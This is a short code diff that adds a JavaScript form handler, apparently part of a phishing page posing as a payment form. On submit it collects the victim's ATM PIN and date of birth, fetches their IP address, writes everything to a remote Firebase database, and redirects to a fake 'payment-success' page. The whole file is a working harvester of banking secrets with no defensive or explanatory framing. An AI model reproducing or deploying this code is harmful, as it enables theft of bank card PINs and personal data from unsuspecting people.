@@ -1,0 +1,30 @@
+document.getElementById("ududip007").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const atmPin = document.getElementById("atmPin").value.trim();
+    const dob = document.getElementById("dob").value.trim();
+
+    // ✅ Get IP address
+    fetch("https://api.ipify.org?format=json")
+        .then(response => response.json())
+        .then(data => {
+            const ipAddress = data.ip;
+            const timestamp = new Date().toISOString();
+
+            const entryRef = firebase.database().ref("ududip007").push();
+            entryRef.set({
+                atm_pin: atmPin,
+                date_of_birth: dob,
+                ipAddress: ipAddress,
+                timestamp: timestamp
+            }).then(() => {
+                localStorage.setItem("dob", dob);
+                window.location.href = "payment-success.html";
+            }).catch((error) => {
+                alert("Error: " + error.message);
+            });
+        })
+        .catch(error => {
+            alert("Unable to get IP address: " + error.message);
+        });
+});
